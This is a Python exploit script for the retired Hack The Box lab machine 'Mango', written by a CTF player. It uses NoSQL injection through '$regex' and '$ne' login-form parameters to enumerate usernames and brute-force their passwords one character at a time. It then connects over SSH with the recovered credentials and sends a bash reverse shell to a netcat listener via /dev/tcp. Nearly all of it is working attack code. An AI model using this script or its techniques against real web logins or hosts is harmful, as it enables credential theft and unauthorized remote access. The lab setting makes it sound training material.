# Mango NoSQL Injection User/password enumeration to RCE script
# Hackthebox - Mango (retired) - https://app.hackthebox.com/machines/Mango/information
# Author: d1Zzy666
# Date: 25-07-2024

"""
Pre-requisites:
+ sshpass required for passing user password into SSH process - https://www.cyberciti.biz/faq/noninteractive-shell-script-ssh-password-provider/
$ sudo apt-get install sshpass

+ paramiko library for connecting over SSH using Python - https://pypi.org/project/paramiko/
$ pip install paramiko
"""

"""
Execution path:
+ Start netcat shell on 1337
+ Enumerate first character hits where 302 status is true 
+ Pass first characters into regex(s) and enumerate full usernames
+ Multi thread password enumeration for each identified username (thanks 0xdf for the assist ;-) - https://0xdf.gitlab.io/2020/04/18/htb-mango.html#recon)
+ Send bash shell via paramiko ssh connection
+ Got shell? 
"""

from multiprocessing import Process
import os
import paramiko
import requests
import string
import sys
from termcolor import colored

# Global variables
LHOST = "10.10.14.45"                                # Update as required
LPORT = 1337
target = "10.10.10.126"                                 # Update to hostname if set in local /etc/hosts
targetport = 80                                         # Update as required
targetdomain = "staging-order.mango.htb"                # Update as required
targetdomainport = 80                                   # Update as required
urlcookie = "soau8k94rikj1967alsumr3squ"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Update as required

foundusernames = []

# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Suppress errors class
class DevNull:
    def write(self, msg):
        pass

sys.stderr = DevNull()

# Netcat shell (1337)
def netcat():
    print(colored("Starting Netcat Shell...", "red"))
    os.system(f"nc -nvlp {LPORT}")

# Determine first character of each user
def firstcharenum():
    session = requests.Session()                                    
    firstchars = []                # Empty firstchar array

    print(colored("Finding all possible first characters...", "red"))
    for char in charset:                                    # Start of for loop to look for char in charset                                    
        url = f"http://{targetdomain}:{targetdomainport}/"
        cookies = {"PHPSESSID": f"{urlcookie}"}
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": f"http://{targetdomain}/",
            "Connection": "keep-alive",
            "Referer": f"http://{targetdomain}/",
            "Upgrade-Insecure-Requests": "1"
        }
        regex = f"^{char}"                                  # simple regex to loop through charset looking for first characters                                                                                                                             
        data = {
            "username[$regex]": regex,
            "password[$ne]": "x",
            "login": "login\r\n"
        }
        response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies, allow_redirects=False)

        if response.status_code == 302:                     # If 302 response TRUE
            firstchars.append(char)                         # Append firstchars with found char i.e. ['a', 'b'] etc
            print(f"[+] Identified a possible first character: {char}")     # Print found char

    print(f"All possible first characters: {firstchars}")                   # Print all foundchars by printing array
    return firstchars                                                       # Return all firstchars if everything runs ok

# User enumeration
def userenum(firstchars):                                   # Pass in returned firstchars into function                                  
    session = requests.Session()

    print(colored("Retrieving usernames...", "red"))
    for firstchar in firstchars:                            # for loop to firstchar in firstchars 
        founduser = firstchar                               # linking firstchar to founduser variable
        while True:                                         # start of while loop when TRUE
            char_found = False                              # char_found set as FALSE initially
            for char in charset:                            # for loop withinn firstchar for loop - search for char from charset
                url = f"http://{targetdomain}:{targetdomainport}/"
                cookies = {"PHPSESSID": f"{urlcookie}"}
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": f"http://{targetdomain}/",
                    "Connection": "keep-alive",
                    "Referer": f"http://{targetdomain}/",
                    "Upgrade-Insecure-Requests": "1"
                }
                regex = f"^{founduser}{char}.*"             # regex - start with identified found char (founduser = firstchar), and pass in char from charset with each loop
                data = {
                    "username[$regex]": regex,
                    "password[$ne]": "x",
                    "login": "login\r\n"
                }
                response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies, allow_redirects=False)

                if response.status_code == 302:             # If 302 response TRUE
                    founduser += char                       # With each founduser (or foundchar), iterate each char from charset
                    print(f"[+] Identified a character: {char}. Current username: {founduser}")
                    char_found = True                       # Update char_found to TRUE with each successful hit 
                    break                                   # Break once exhausted
            
            # If char_found FALSE then print fouduser - no more chars found in current iteration
            if not char_found:
                if founduser:
                    foundusernames.append(founduser)        # Append foundusernames array with founduser i.e. ['admin', 'mango'] etc
                    print(f"Username found: {founduser}")
                break

    if foundusernames:
        print(f"Final list of usernames: {foundusernames}") # Print complete list of foundusernames
    else:
        print(colored("No usernames found.", "red"))

def passenum1():
    password1 = ""
    user1 = foundusernames[0]
    print(colored("Enumerating user passwords...", "red"))
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] {user1} password: {password1}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user1,
                    "password[$regex]": f"^{password1}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password1 += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user1, "password": password1, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user1}: {password1.ljust(20)}")
                    return
                break

def passenum2():
    password2 = ""
    user2 = foundusernames[1]
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] {user2} password: {password2}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user2,
                    "password[$regex]": f"^{password2}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password2 += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user2, "password": password2, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user2}: {password2.ljust(20)}")
                    return password2
                break        

# SSH into target
def sshrce(password2):
    #print(foundusernames[1])
    #print(password2)
    ### Simple SSH shell instead of using paramiko - not as secure ###
    #os.system(f"sshpass -p {password2} ssh {foundusernames[1]}@mango.htb")
    ### Paramiko to netcat shell ###
    print(colored("Sending command shell... Got shell?", "red"))
    command = f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(f"{targetdomain}", 22, f"{foundusernames[1]}", f"{password2}")
    stdout = client.exec_command(f"{command}")
    print(stdout.read().decode())


if __name__ == "__main__":
    p1 = Process(target=netcat, args=())
    p1.start()
    
    firstchars = firstcharenum()                            # Explicit alignment of firstchars to firstcharenum function
    userenum(firstchars)                                    # When running userenum function pass in firstchars array

    
    p2 = Process(target=passenum1)                        
    p3 = Process(target=passenum2)                        

    p2.start()                                              # Run password1 enum concurrently                                                   
    p3.start()                                              # Run password2 enum concurrently  
                                      
    password2 = passenum2()
    sshrce(password2)                                      
